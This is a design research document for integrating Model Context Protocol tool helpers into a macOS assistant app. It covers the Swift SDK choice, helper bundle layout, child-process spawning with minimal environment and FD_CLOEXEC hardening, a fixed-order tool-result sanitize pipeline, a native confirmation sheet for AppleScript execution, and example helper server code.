# Phase 5: MCP — Research

**Researched:** 2026-04-22
**Domain:** MCP (Model Context Protocol) client wiring — official Swift SDK, nested helper `.app` bundles, confirmation broker, sanitize pipeline
**Confidence:** HIGH on SDK surface (v0.12.0 shipped 2026-03-24, source-verified), HIGH on codesign/entitlement infra (P1-05 scripts already walk `Contents/Helpers/**/*.app` deepest-first), HIGH on sanitize/sanitize-order (AUDIT-R4-Sec3 contract); MEDIUM on per-helper TCC identity (the mechanism is well-documented but the first-run prompt text differs from generic app prompts and only a real launch confirms the exact user-facing string).

## Summary

Phase 5 turns the MCP integration from a codesign scaffold (P1-05 completed the deepest-first walker + per-helper entitlement grep + forbidden-entitlement regressions) into a live tool execution path. Three helpers (`mcp-time`, `mcp-clipboard`, `mcp-applescript`) ship as separately codesigned nested `.app` bundles under `Jarvis.app/Contents/Helpers/`. A single `MCPClient` actor in the main app spawns each helper as a child process, wires its stdin/stdout to a `StdioTransport` from `modelcontextprotocol/swift-sdk v0.12.0`, and funnels `callTool` requests from `AgentOrchestrator` through a per-server restart mutex. Helper crashes drain the in-flight continuation map with `MCPError.serverCrashed` and lazy-restart on the next call. Every tool-result byte stream flows through a **fixed-order pipeline** — sanitize → headTruncate → wrapUntrusted — before being packed into `LLMMessage` history. Destructive tools (`run_applescript` in v1) gate on a `ConfirmationBroker` four-state FSM that drives a native-AppKit confirmation sheet on a hidden `NSPanel` — **never** a webview modal. `ChildSpawnGate` is the single choke point for every `Process()` launch in the codebase: it sets `FD_CLOEXEC` on parent long-lived FDs (ReplayLog SQLite WAL, log channels) before spawn and replaces the environment with `PATH=/usr/bin:/bin` only.

**Primary recommendation:** Vendor `modelcontextprotocol/swift-sdk v0.12.0` as the `MCP` SPM product (already source-verified: `platforms: .macOS("13.0")`, matches our deployment target) and build the spawn-and-wire glue ourselves — the SDK ships `StdioTransport` parameterized on `FileDescriptor` but does **not** ship a parent-side subprocess spawner. The glue is ~100 LOC of `Foundation.Process` + `Pipe.fileHandleForReading.fileDescriptor` wrapping, not the ~400 LOC of hand-rolled NDJSON framing the brief originally feared.

## Architectural Responsibility Map

| Capability | Primary Tier | Secondary Tier | Rationale |
|------------|-------------|----------------|-----------|
| Spawning helper processes | Swift host (`MCPClient` actor) | — | Browsers can't spawn; Swift is the only process-boundary owner |
| JSON-RPC 2.0 framing over stdio | `MCP` SPM (SDK v0.12.0 `StdioTransport`) | — | SDK owns the protocol byte-layer; don't re-implement |
| Per-helper tool registration | Each helper process | — | Helpers are isolated JSON-RPC servers; parent is client |
| Tool-call dispatch + routing | Swift host (`AgentOrchestrator` → `MCPClient`) | — | Orchestrator dispatches; MCPClient routes to the right helper |
| Confirmation UI (destructive tools) | Swift host (`ConfirmationBroker` + AppKit sheet on `NSPanel`) | HUD (status ring reflects `.awaitingConfirmation`) | Webview modal parks MainActor and is forgeable; native AppKit is the only trustworthy surface |
| Tool-result sanitize / head-truncate / wrap | Swift host (between `MCPClient.callTool` and `LLMMessage` append) | — | Sanitize runs in one place on the trusted-boundary hop |
| AppleScript execution | `mcp-applescript` helper (own TCC identity) | — | Only helper holding `com.apple.security.automation.apple-events`; main app must NOT |
| NSPasteboard read | `mcp-clipboard` helper | — | Helper owns its Keychain/UserDefaults isolation; refuses `NSPasteboardTypeFileURL` regardless of string content |
| Time retrieval | `mcp-time` helper | — | Trivial helper exists primarily to prove the 3-helper-bundle codesign matrix under live call load |

## Standard Stack

### Core

| Library | Version | Purpose | Why Standard |
|---------|---------|---------|--------------|
| `modelcontextprotocol/swift-sdk` | **0.12.0** (published 2026-03-24) | MCP Client, Server, StdioTransport, `withMethodHandler(ListTools.self/CallTool.self)` | Official SDK, source-verified Package.swift declares `.macOS("13.0")` matching our deployment target; `swift-tools-version:6.1`. Supersedes the ~400 LOC of hand-rolled NDJSON JSON-RPC from pre-P1 `IMPL-week-one.md §7` [VERIFIED: github.com/modelcontextprotocol/swift-sdk Package.swift@0.12.0] |
| `swift-log` | `apple/swift-log 1.5.3+` | Logger passed into `StdioTransport(logger:)` and `Server(logger:)` | Already a transitive dep via P1-02 Logging package; SDK requires `Logging` module [VERIFIED: swift-sdk Package.swift dependencies] |
| `swift-system` | 1.0.0+ | `FileDescriptor` type used by `StdioTransport` | Transitive dep of swift-sdk; already pinned at 1.0.0+ by the SDK's Package.swift [VERIFIED: swift-sdk Package.swift] |
| `Foundation.Process` + `Pipe` | Stdlib | Parent-side child spawning — wires child stdin/stdout into a `FileDescriptor` before handing to `StdioTransport` | The SDK deliberately does NOT ship a subprocess spawner. Swift's newer `Subprocess` package (SF-0007/SF-0037) is still pre-1.0 as of April 2026 [VERIFIED: forums.swift.org/t/review-sf-0037-subprocess-1-0/86004 — third review window ran through April 20, 2026] [CITED: https://swiftonserver.com/structured-concurrency-and-shared-state-in-swift/] |

### Supporting

| Library | Version | Purpose | When to Use |
|---------|---------|---------|-------------|
| `NSAppleScript` (AppKit) | Stdlib | AppleScript execution inside `mcp-applescript` | `NSAppleScript(source:)` + `executeAndReturnError(_:)`. Returns `NSAppleEventDescriptor`; errors come back as `NSDictionary?` out-param [CITED: developer.apple.com/documentation/foundation/nsapplescript] |
| `NSPasteboard` (AppKit) | Stdlib | Clipboard reads inside `mcp-clipboard` | `NSPasteboard.general.types` returns `[NSPasteboard.PasteboardType]`; test `.contains(.fileURL)` **before** `.string(forType: .string)`. `.fileURL` is the Swift name for `NSPasteboardTypeFileURL` [CITED: developer.apple.com/documentation/appkit/nspasteboardtypefileurl] |
| `Darwin` / `fcntl` | Stdlib | `FD_CLOEXEC` enforcement on parent-held FDs before `Process().run()` — MCP-08 | `fcntl(fd, F_SETFD, FD_CLOEXEC)` on every long-lived FD (ReplayLog SQLite WAL, log channels). Alternative: open FDs with `O_CLOEXEC` at creation time and assert in `ChildSpawnGate` [CITED: pubs.opengroup.org/onlinepubs/007904975/functions/posix_spawn.html] |

### Alternatives Considered

| Instead of | Could Use | Tradeoff |
|------------|-----------|----------|
| Official `modelcontextprotocol/swift-sdk` v0.12.0 | Hand-rolled NDJSON JSON-RPC 2.0 framing (the pre-P1 `IMPL-week-one.md §7` approach) | Hand-rolled is ~400 LOC of framing + init-handshake + continuation map + sanitize-control + restart mutex we'd otherwise build. SDK is 2026-official and actively maintained (v0.12.0 shipped 2026-03-24). **Reject hand-roll.** [CITED: CLAUDE.md "Supersedes the roll-your-own NDJSON JSON-RPC..."] |
| `Foundation.Process` + `Pipe` | Apple's `swift-subprocess` SF-0037 1.0 (concurrency-native, spawn-from-actor-friendly) | SF-0037 review runs through 2026-04-20 — still not 1.0 at research time. `Process` + `Pipe` is battle-tested and a well-known recipe works (pipe FDs → `FileDescriptor(rawValue:)` → `StdioTransport`). [VERIFIED: forums.swift.org review thread; CITED: blog.glacio.tech/building-a-mcp-client-in-swift-a-step-by-step-guide-part-2] |
| `NSAppleScript` in-process | `osascript` via `Process` subprocess | `NSAppleScript` keeps AppleScript inside the `mcp-applescript` helper's own TCC identity (what we want — per-helper prompts). `osascript` would fork a separate `/usr/bin/osascript` child, inheriting a mixed identity from the helper. **Use `NSAppleScript`.** Secondary advantage: synchronous API inside the helper's handler closure [CITED: medium.com/macoclock execute-applescript-with-appkit-swift article] |
| Webview modal confirmation | Native AppKit sheet on hidden `NSPanel` | Webview modal is **forgeable by XSS** on raw tool-result render and parks MainActor so barge-in can't cancel it. Native AppKit sheet on a dedicated hidden `NSPanel` is the only trustworthy surface. Lint rule forbids modal presentation on any `@MainActor` presentation path. [CITED: PITFALLS.md #8 + AUDIT-R4-Sec4 (broaden runModal lint scope module-wide)] |

**Installation:**

```swift
// packages/MCP/Package.swift
dependencies: [
    .package(url: "https://github.com/modelcontextprotocol/swift-sdk", exact: "0.12.0"),
    .package(path: "../Logging"),
]
```

**Version verification** (run before pinning; SDK is pre-1.0, verify at plan time):
```bash
curl -s "https://api.github.com/repos/modelcontextprotocol/swift-sdk/releases/latest" | jq -r '.tag_name, .published_at'
# Verified 2026-04-22: 0.12.0 — 2026-03-24T... (current as of today)
```

## Architecture Patterns

### System Architecture Diagram

```
                 ┌────────────── AgentOrchestrator (actor) ────────────┐
                 │ publish(.toolCallStart) ──► HUD coordinator          │
                 │ await mcpClient.callTool(name, args, turnId)         │
                 │ sanitize(result.content)   [SEC-07 step 1]           │
                 │ headTruncate(_, capBytes: 8_192)  [AGENT-08 / step 2]│
                 │ wrapUntrusted(_, nonce: turnNonce)  [SEC-06 / step 3]│
                 │ history.append(LLMMessage.toolResult(wrapped, id))   │
                 └───────────────────────────┬──────────────────────────┘
                                             │ callTool(name, args)
                                             ▼
┌──────────────────────────────── MCPClient (actor) ───────────────────────────────┐
│  registry: [String: MCPServerHandle]                                              │
│    "get_time"        → &handle[mcp-time]                                          │
│    "get_clipboard"   → &handle[mcp-clipboard]                                     │
│    "run_applescript" → &handle[mcp-applescript]                                   │
│                                                                                    │
│  struct MCPServerHandle {                                                          │
│    let bundleName: String                 // "mcp-time"                            │
│    var client: Client                     // SDK client, already connected         │
│    var process: Process                   // Foundation.Process handle             │
│    var stdinPipe: Pipe                    // parent → child                        │
│    var stdoutPipe: Pipe                   // child → parent                        │
│    var stderrPipe: Pipe                   // child → log channel                   │
│    var restartTask: Task<Void, Error>?    // in-flight lazy restart, per-server    │
│    var requiresConfirmation: Bool         // true for mcp-applescript              │
│  }                                                                                 │
│                                                                                    │
│  on child EOF (stdout close):                                                      │
│    1. Mark handle as crashed                                                       │
│    2. SDK.Client.disconnect() drains its pending-request map                       │
│       with MCPError.internalError("Client disconnected") [VERIFIED: Client.swift]  │
│    3. Wrap into MCPError.serverCrashed at our boundary so orchestrator can retry   │
│    4. Next callTool(name) awaits handle.restartTask if one is in flight,           │
│       OR creates a single new restart task (per-server mutex)                      │
└─────────────────────────┬───────────────────────┬───────────────────────┬─────────┘
                          │                       │                       │
              ┌───────────▼────────┐  ┌───────────▼────────┐  ┌───────────▼────────┐
              │ ChildSpawnGate     │  │ ChildSpawnGate     │  │ ChildSpawnGate     │
              │  • FD_CLOEXEC      │  │  • FD_CLOEXEC      │  │  • FD_CLOEXEC      │
              │    scan via        │  │    scan            │  │    scan            │
              │    /dev/fd         │  │  • PATH=/usr/bin:  │  │  • PATH=/usr/bin:  │
              │  • PATH=/usr/bin:  │  │    /bin            │  │    /bin            │
              │    /bin only       │  │  • no HOME, no     │  │  • no HOME, no     │
              │  • no HOME, no     │  │    USER, no PWD    │  │    USER, no PWD    │
              │    USER, no PWD    │  │    inheritance     │  │    inheritance     │
              └───────────┬────────┘  └───────────┬────────┘  └───────────┬────────┘
                          │                       │                       │
                          ▼                       ▼                       ▼
        Jarvis.app/Contents/Helpers/     .../mcp-clipboard.app/      .../mcp-applescript.app/
          mcp-time.app/Contents/             Contents/MacOS/             Contents/MacOS/
          MacOS/mcp-time                     mcp-clipboard               mcp-applescript
        ┌────────────────────────┐         ┌─────────────────────┐   ┌───────────────────────┐
        │  Server v=1.0.0        │         │  Server v=1.0.0     │   │  Server v=1.0.0       │
        │  name="mcp-time"       │         │  name="mcp-clip..." │   │  name="mcp-apple..."  │
        │  stdin/stdout →        │         │  stdin/stdout →     │   │  stdin/stdout →       │
        │  StdioTransport        │         │  StdioTransport     │   │  StdioTransport       │
        │  withMethodHandler:    │         │  withMethodHandler: │   │  withMethodHandler:   │
        │   ListTools → [time]   │         │   ListTools → [clp] │   │   ListTools →[applscr]│
        │   CallTool  → ISO 8601 │         │   CallTool:         │   │   CallTool:           │
        │                        │         │    if types contain │   │    NSAppleScript(src) │
        │  Info.plist:           │         │    .fileURL ▶ err   │   │    .executeAndReturn()│
        │   LSUIElement=YES      │         │    else NSPasteb... │   │                       │
        │   LSBackgroundOnly=YES │         │                     │   │  entitlements:        │
        │   CFBundleIdentifier=  │         │  entitlements:      │   │   automation.         │
        │    com.koftwentytwo.   │         │   (none beyond      │   │    apple-events=true  │
        │    jarvis.mcp-time     │         │    inherited        │   │                       │
        │                        │         │    hardened-runtime)│   │  TCC prompt on first  │
        │  entitlements: NONE    │         │                     │   │   call:               │
        │   (no special grants)  │         │  Info.plist:        │   │   "mcp-applescript    │
        │                        │         │   com.koftwentytwo. │   │    wants to control   │
        │                        │         │   jarvis.mcp-clip...│   │    {target app}"      │
        └────────────────────────┘         └─────────────────────┘   └───────────────────────┘
```

Data flow for a tool-gated turn:

```
orchestrator.submit(userInput)
  → provider.stream(...) yields .toolUseRequested(id: "abc", name: "run_applescript", args: {...})
    → orchestrator.publish(.toolCallStart(id, name, args: {awaitingApproval: true}))  [SEC-06 args masked]
    → broker.request(id, name, argsPreview) awaits broker.response(id) for 60s
       → ConfirmationPresenter shows sheet on hidden NSPanel
       → user clicks Approve / Deny / times-out / voice-barges
    → broker returns .approve | .deny | .timeout | .barge
    → if .approve:
        mcpClient.callTool(name: "run_applescript", arguments: args)
        sanitize → headTruncate → wrapUntrusted
        history.append(toolResult)
        provider.stream again with updated history
      else:
        history.append(toolResult(content: "user declined / timeout / barge"))
        provider.stream again
```

### Recommended Project Structure

```
packages/
├── MCP/                                  # NEW in Phase 5
│   ├── Package.swift                     # deps: swift-sdk 0.12.0, Logging
│   └── Sources/MCP/
│       ├── MCPClient.swift               # actor; registry; restart mutex; ChildSpawnGate hook
│       ├── MCPServerHandle.swift         # struct holding Client + Process + Pipes
│       ├── ChildSpawnGate.swift          # single choke point for every Process().run()
│       ├── SanitizeForModel.swift        # sanitize → headTruncate → wrapUntrusted (SEC-07)
│       ├── ConfirmationBroker.swift      # 4-state FSM + AsyncChannel<ConfirmationEvent>
│       ├── ConfirmationPresenter.swift   # @MainActor; AppKit sheet on hidden NSPanel
│       ├── ToolRegistry.swift            # Tool descriptors → provider tool-schema JSON
│       └── MCPError.swift                # .serverCrashed, .helperMissing, .startupTimeout, etc.
│
├── ... (existing: Keychain, Config, Logging, Shell)
│
mcp-servers/                              # NEW at top level — peer targets
├── mcp-time/
│   ├── Package.swift                     # executable, MCP SDK dep
│   ├── Sources/mcp-time/main.swift       # Server.start(transport:) + withMethodHandler
│   └── Support/
│       ├── Info.plist                    # LSUIElement=YES, LSBackgroundOnly=YES, CFBundleId=com.koftwentytwo.jarvis.mcp-time
│       └── mcp-time.entitlements         # empty; inherits only Hardened Runtime
├── mcp-clipboard/
│   ├── Package.swift
│   ├── Sources/mcp-clipboard/main.swift
│   └── Support/
│       ├── Info.plist
│       └── mcp-clipboard.entitlements    # empty
└── mcp-applescript/
    ├── Package.swift
    ├── Sources/mcp-applescript/main.swift
    └── Support/
        ├── Info.plist                    # plus NSAppleEventsUsageDescription
        └── mcp-applescript.entitlements  # com.apple.security.automation.apple-events=true
```

**Why `mcp-servers/` is a top-level peer, not under `packages/`:** xcodegen + SPM packages won't emit peer-executable targets with per-target `Info.plist` + `CODE_SIGN_ENTITLEMENTS` + `PRODUCT_BUNDLE_IDENTIFIER`. Declaring each helper as a full xcodegen `target` gives us the per-helper TCC identity mechanism we need. Build products land in `BUILT_PRODUCTS_DIR/<name>.app`, and a new `copyFiles` phase on the main Jarvis target copies them into `Jarvis.app/Contents/Helpers/<name>.app/`. `scripts/codesign.sh` already walks `Contents/Helpers/**/*.app` deepest-first [VERIFIED: scripts/codesign.sh line 27-41 `find -depth`].

### Pattern 1: MCPClient spawn-and-wire (parent-side subprocess)

**What:** Spawn a helper `.app` binary, wire its stdin/stdout into Foundation Pipes, hand the pipe FDs to `StdioTransport`, then connect the SDK `Client`.
**When to use:** Every helper registration at startup; also on restart after crash.
**Example (composite from SDK source + glacio.tech guide):**

```swift
// Source: github.com/modelcontextprotocol/swift-sdk/blob/0.12.0/Sources/MCP/Base/Transports/StdioTransport.swift
// Source: https://blog.glacio.tech/building-a-mcp-client-in-swift-a-step-by-step-guide-part-2
// Source: docs verified 2026-04-22

import MCP
import System  // FileDescriptor
import Foundation

actor MCPServerHandle {
    let name: String
    let binaryURL: URL
    private(set) var process: Process
    private(set) var client: Client
    private(set) var stdinPipe: Pipe
    private(set) var stdoutPipe: Pipe
    private(set) var stderrPipe: Pipe
    private var restartTask: Task<Void, Error>?

    init(name: String, binaryURL: URL) {
        self.name = name
        self.binaryURL = binaryURL
        self.process = Process()
        self.client = Client(name: "Jarvis", version: "1.0.0")
        self.stdinPipe = Pipe()
        self.stdoutPipe = Pipe()
        self.stderrPipe = Pipe()
    }

    func start() async throws {
        // 1. ChildSpawnGate enforcement: FD_CLOEXEC sweep, minimal env.
        try ChildSpawnGate.shared.prepare()

        // 2. Wire Process.
        process.executableURL = binaryURL
        process.standardInput = stdinPipe
        process.standardOutput = stdoutPipe
        process.standardError = stderrPipe
        process.environment = ["PATH": "/usr/bin:/bin"]  // minimal; no HOME/USER/PWD inheritance

        // 3. Launch.
        try process.run()

        // 4. Convert pipe FileHandles to FileDescriptors for StdioTransport.
        //    Note: stdoutPipe.fileHandleForReading is the PARENT's read end of the CHILD's stdout.
        //    Note: stdinPipe.fileHandleForWriting  is the PARENT's write end of the CHILD's stdin.
        let transportInput  = FileDescriptor(rawValue: stdoutPipe.fileHandleForReading.fileDescriptor)
        let transportOutput = FileDescriptor(rawValue: stdinPipe.fileHandleForWriting.fileDescriptor)

        let transport = StdioTransport(
            input: transportInput,
            output: transportOutput,
            logger: Logger(label: "mcp.client.\(name)")
        )

        // 5. Connect. SDK auto-runs the initialize handshake.
        let initResult = try await client.connect(transport: transport)
        guard initResult.capabilities.tools != nil else {
            throw MCPError.helperMissingToolsCapability(name)
        }

        // 6. Wire stderr → log channel (deliberately drain so helpers can log freely).
        startStderrPump()

        // 7. Wire Process.terminationHandler → async onEOF path.
        process.terminationHandler = { [weak self] _ in
            Task { await self?.handleTermination() }
        }
    }

    /// On helper EOF: mark crashed, disconnect SDK client (drains its pending map), surface
    /// MCPError.serverCrashed to any awaiting caller. Restart is LAZY — happens on next callTool.
    private func handleTermination() async {
        await client.disconnect()  // SDK drains pending-request map with .internalError
    }
}
```

### Pattern 2: Per-server restart mutex (MCP-07)

**What:** When the helper crashes, multiple concurrent `callTool` paths may race to restart it. Serialize restarts through a single `restartTask: Task<Void, Error>?` slot.
**When to use:** Every `callTool` path checks the handle state and awaits the in-flight restart before dispatch.
**Example:**

```swift
// Source: ARCHITECTURE.md §Component responsibilities (MCPClient) — R3-A13 pattern
//         + PITFALLS #10 "MCP child crash leaks continuations"

extension MCPClient {
    func callTool(name: String, arguments: [String: Value]) async throws -> (content: [Tool.Content], isError: Bool) {
        guard let handle = registry[toolToServer[name]!] else {
            throw MCPError.helperMissing(name)
        }

        // 1. If restart is in flight, wait for it (concurrent callers share one restart).
        if let task = await handle.restartTask {
            try await task.value
        }

        // 2. If crashed and no restart in flight, start one.
        if await handle.isCrashed, await handle.restartTask == nil {
            let task = Task { try await handle.start() }
            await handle.setRestartTask(task)
            defer { Task { await handle.setRestartTask(nil) } }
            try await task.value
        }

        // 3. Dispatch through SDK client.
        return try await handle.client.callTool(name: name, arguments: arguments)
    }
}
```

**Crash-injection test** (MCP-07 acceptance): spawn a helper, send SIGKILL via `process.terminate()`, observe one restart; loop 100 times, assert no FD leaks (`sysctl kern.num_files` baseline vs. post-loop within ±16).

### Pattern 3: ChildSpawnGate (MCP-08)

**What:** Single choke point enforcing `FD_CLOEXEC` on parent-held long-lived FDs + minimal environment for every `Process().run()` in the codebase.
**When to use:** EVERY `Process.run()` call must go through it. Lint rule (module-wide `grep`) forbids bare `process.run()` outside `MCP/ChildSpawnGate.swift`.
**Example:**

```swift
// Source: PITFALLS.md #10 + pubs.opengroup.org/posix_spawn docs
// Source: https://wiki.sei.cmu.edu/confluence/display/c/FIO22-C.+Close+files+before+spawning+processes

import Darwin
import Foundation

actor ChildSpawnGate {
    static let shared = ChildSpawnGate()

    /// Called BEFORE any Process.run(). Walks the current process's open file descriptors
    /// and enforces FD_CLOEXEC on anything above stderr that isn't explicitly whitelisted.
    /// Designed to be cheap on the happy path (we set FD_CLOEXEC once per FD at open-time
    /// via O_CLOEXEC whenever possible; this sweep is a belt-and-braces defense).
    func prepare() throws {
        let fdMax = getdtablesize()
        for fd in 3..<fdMax {
            let flags = fcntl(fd, F_GETFD)
            guard flags >= 0 else { continue }  // FD not open; skip
            if flags & FD_CLOEXEC == 0 {
                // FD is open and NOT CLOEXEC — this is a leak.
                #if DEBUG
                fatalError("FD \(fd) is not FD_CLOEXEC — origin must be instrumented")
                #else
                _ = fcntl(fd, F_SETFD, flags | FD_CLOEXEC)
                Logger(label: "mcp.spawn.gate").warning("FD \(fd) was not FD_CLOEXEC; retrofitted")
                #endif
            }
        }
    }
}

// Enforcement in MCPServerHandle.start():
//   try ChildSpawnGate.shared.prepare()
//   process.environment = ["PATH": "/usr/bin:/bin"]
//   try process.run()
```

**Opening FDs with O_CLOEXEC at creation time** is the preferred path (ReplayLog's SQLite WAL, log file handles). The sweep catches anything that slipped through — a belt-and-braces defense recommended by CERT FIO22-C.

### Pattern 4: Sanitize pipeline, fixed order (SEC-07 / AUDIT-R4-Sec3)

**What:** Three-step transform applied to every MCP-boundary byte stream before it packs into `LLMMessage` history.
**When to use:** After `mcpClient.callTool` returns, before `history.append(toolResult)`. Replay log captures BOTH pre- and post-sanitize bytes so drift between captures can be debugged.
**Example:**

```swift
// Source: SEC-07 + AUDIT-R4-Sec3 (sanitize BEFORE headTruncate, BEFORE wrapUntrusted)
// Source: PITFALLS.md #8 (bidi/zero-width strip)
// Source: https://invisiblecharacterviewer.com/characters/zero-width-space

enum SanitizeForModel {
    /// Canonical fixed order: sanitize → headTruncate → wrapUntrusted.
    /// DO NOT reorder. headTruncate before sanitize leaks invalid UTF-8 into the head bytes.
    /// wrapUntrusted before headTruncate wraps the truncation marker in an untrusted tag
    /// where the nonce guarantee no longer applies.
    static func prepare(
        _ raw: String,
        capBytes: Int = 8_192,
        turnNonce: String
    ) -> String {
        let sanitized = sanitize(raw)
        let capped    = headTruncate(sanitized, capBytes: capBytes)
        let wrapped   = wrapUntrusted(capped, nonce: turnNonce)
        return wrapped
    }

    /// Step 1: UTF-8 valid; strip C0 controls except \t (0x09); strip bidi/zero-width;
    ///         cap any single line at 4 KB to prevent line-joining attacks.
    private static func sanitize(_ input: String) -> String {
        // U+0000..U+001F C0 controls EXCEPT \t (U+0009). U+007F DEL also struck.
        // Bidi overrides: U+202A..U+202E, U+2066..U+2069.
        // Zero-width:    U+200B, U+200C, U+200D, U+2060, U+FEFF.
        let allowed = input.unicodeScalars.filter { scalar in
            let v = scalar.value
            if v == 0x09 { return true }                           // \t kept
            if v < 0x20 || v == 0x7F { return false }              // C0 + DEL dropped
            if (0x202A...0x202E).contains(v) { return false }      // bidi override
            if (0x2066...0x2069).contains(v) { return false }      // bidi isolate
            switch v {
            case 0x200B, 0x200C, 0x200D, 0x2060, 0xFEFF: return false  // zero-width / BOM
            default: return true
            }
        }
        var out = String(String.UnicodeScalarView(allowed))

        // Cap any single line at 4 KB.
        out = out.split(separator: "\n", omittingEmptySubsequences: false)
            .map { $0.count > 4_096 ? String($0.prefix(4_096)) + "…[line-truncated]" : String($0) }
            .joined(separator: "\n")
        return out
    }

    /// Step 2: Head-truncate to 8 KB with a canonical marker.
    private static func headTruncate(_ input: String, capBytes: Int) -> String {
        let data = Data(input.utf8)
        guard data.count > capBytes else { return input }
        let head = data.prefix(capBytes)
        let headStr = String(decoding: head, as: UTF8.self)
        return headStr + "\n…[tool-result-truncated at \(capBytes) bytes]"
    }

    /// Step 3: Wrap in untrusted-content tags using the per-turn random nonce.
    /// nonce never crosses to webview (SEC-06).
    private static func wrapUntrusted(_ input: String, nonce: String) -> String {
        // Pre-strip tag-like substrings that could close the wrap. The per-turn nonce
        // means even a successful strip isn't load-bearing, but it's belt-and-braces.
        var clean = input
        clean = clean.replacingOccurrences(of: "<UNTRUSTED_CONTENT",  with: "<_UNTRUSTED_CONTENT")
        clean = clean.replacingOccurrences(of: "</UNTRUSTED_CONTENT", with: "<_/UNTRUSTED_CONTENT")
        return "<UNTRUSTED_CONTENT id=\"\(nonce)\">\n\(clean)\n</UNTRUSTED_CONTENT id=\"\(nonce)\">"
    }
}
```

### Pattern 5: ConfirmationBroker 4-state FSM (MCP-09 / AGENT-11)

**What:** Non-blocking sheet on a hidden `NSPanel`, four legal transitions, late-hop transitions no-op.
**When to use:** Every tool registered with `requiresConfirmation: true` (v1: `run_applescript` only).
**Example:**

```swift
// Source: MCP-09 + AGENT-11 + AUDIT-R4-Sec4 (lint ban: module-wide forbid modalPresentation)
// Source: ARCHITECTURE.md §Component responsibilities — ConfirmationBroker row

enum ConfirmationOutcome {
    case approve, deny, timeout, barge
}

actor ConfirmationBroker {
    struct PendingRequest {
        let id: UUID
        let toolName: String
        let argsPreview: String    // sanitized preview of args for presenter display
        var outcome: ConfirmationOutcome?
        var continuation: CheckedContinuation<ConfirmationOutcome, Never>?
    }

    private var pending: [UUID: PendingRequest] = [:]
    private let presenter: ConfirmationPresenter  // @MainActor — hidden NSPanel

    /// Called by orchestrator on .toolUseRequested for a requiresConfirmation tool.
    /// Returns when broker.response(id, outcome) is called OR 60s timeout fires.
    func request(id: UUID, toolName: String, argsPreview: String) async -> ConfirmationOutcome {
        let outcome: ConfirmationOutcome = await withCheckedContinuation { continuation in
            let req = PendingRequest(
                id: id, toolName: toolName, argsPreview: argsPreview,
                outcome: nil, continuation: continuation
            )
            pending[id] = req
            Task { await presenter.show(id: id, toolName: toolName, argsPreview: argsPreview) }

            // 60s timeout timer (AGENT-11).
            Task {
                try? await Task.sleep(for: .seconds(60))
                await self.response(id: id, outcome: .timeout)
            }
        }
        return outcome
    }

    /// Called by presenter (.approve/.deny), timeout timer (.timeout), or
    /// VoiceController on wake-during-confirmation (.barge).
    /// LATE TRANSITIONS NO-OP — first outcome wins.
    func response(id: UUID, outcome: ConfirmationOutcome) async {
        guard var req = pending[id] else { return }      // already resolved
        guard req.outcome == nil else { return }         // late hop — no-op
        req.outcome = outcome
        pending[id] = req
        req.continuation?.resume(returning: outcome)
        pending[id] = nil
        await presenter.dismiss(id: id)
    }
}

@MainActor
final class ConfirmationPresenter {
    private var sheets: [UUID: NSPanel] = [:]

    func show(id: UUID, toolName: String, argsPreview: String) {
        // Build NSPanel with .nonactivatingPanel, .titled, appearance glued to HUD.
        // Attach beginSheet on a hidden owner NSPanel so user focus isn't hijacked.
        // Forbidden: runModal, beginModalSession, NSApplication.run — all lint-banned.
    }

    func dismiss(id: UUID) { sheets[id]?.close(); sheets[id] = nil }
}
```

### Pattern 6: Helper process structure

**What:** Each helper is a standalone executable using the SDK's `Server` type + `StdioTransport` on its own stdin/stdout.
**Example (mcp-time/main.swift):**

```swift
// Source: github.com/modelcontextprotocol/swift-sdk README + artemnovichkov.com MCP server guide

import MCP
import Foundation

@main
struct MCPTime {
    static func main() async throws {
        let server = Server(
            name: "mcp-time",
            version: "1.0.0",
            capabilities: .init(tools: .init(listChanged: false))
        )

        await server.withMethodHandler(ListTools.self) { _ in
            .init(tools: [
                Tool(
                    name: "get_time",
                    description: "Returns the current local date and time as ISO 8601.",
                    inputSchema: .object([
                        "properties": .object([:]),
                        "required": .array([])
                    ])
                )
            ])
        }

        await server.withMethodHandler(CallTool.self) { params in
            guard params.name == "get_time" else {
                return .init(content: [.text(text: "Unknown tool", annotations: nil, _meta: nil)], isError: true)
            }
            let iso = ISO8601DateFormatter().string(from: Date())
            return .init(content: [.text(text: iso, annotations: nil, _meta: nil)], isError: false)
        }

        let transport = StdioTransport()
        try await server.start(transport: transport)
        await server.waitUntilCompleted()
    }
}
```

### Pattern 7: mcp-clipboard file-URL refusal (MCP-03)

```swift
// Source: http://nspasteboard.org/ + developer.apple.com/documentation/appkit/nspasteboardtypefileurl
// Source: github.com/p0deje/Maccy/blob/master/Maccy/Clipboard.swift (reference impl)

import AppKit

await server.withMethodHandler(CallTool.self) { params in
    let pb = NSPasteboard.general
    // MCP-03: refuse pasteboards carrying NSPasteboardTypeFileURL regardless of string content.
    if let types = pb.types, types.contains(.fileURL) {
        return .init(
            content: [.text(text: "Clipboard contains a file URL; refusing to expose to model (MCP-03).", annotations: nil, _meta: nil)],
            isError: true
        )
    }
    guard let s = pb.string(forType: .string), !s.isEmpty else {
        return .init(content: [.text(text: "(clipboard empty)", annotations: nil, _meta: nil)], isError: false)
    }
    return .init(content: [.text(text: s, annotations: nil, _meta: nil)], isError: false)
}
```

### Pattern 8: mcp-applescript NSAppleScript execution

```swift
// Source: developer.apple.com/documentation/foundation/nsapplescript
// Source: medium.com/macoclock "Execute AppleScript with AppKit with Swift"
// Source: github.com/peakmojo/applescript-mcp (reference MCP-over-stdio AppleScript helper)

import Foundation

await server.withMethodHandler(CallTool.self) { params in
    guard params.name == "run_applescript" else {
        return .init(content: [.text(text: "Unknown tool", annotations: nil, _meta: nil)], isError: true)
    }
    guard let source = params.arguments?["source"]?.stringValue else {
        return .init(content: [.text(text: "Missing 'source' argument.", annotations: nil, _meta: nil)], isError: true)
    }
    guard let script = NSAppleScript(source: source) else {
        return .init(content: [.text(text: "AppleScript source failed to compile.", annotations: nil, _meta: nil)], isError: true)
    }
    var errorInfo: NSDictionary?
    let result = script.executeAndReturnError(&errorInfo)
    if let err = errorInfo {
        let num = err["NSAppleScriptErrorNumber"] as? Int ?? 0
        let msg = err["NSAppleScriptErrorMessage"] as? String ?? "unknown"
        return .init(content: [.text(text: "AppleScript error \(num): \(msg)", annotations: nil, _meta: nil)], isError: true)
    }
    let text = result.stringValue ?? "(no return value)"
    return .init(content: [.text(text: text, annotations: nil, _meta: nil)], isError: false)
}
```

### Anti-Patterns to Avoid

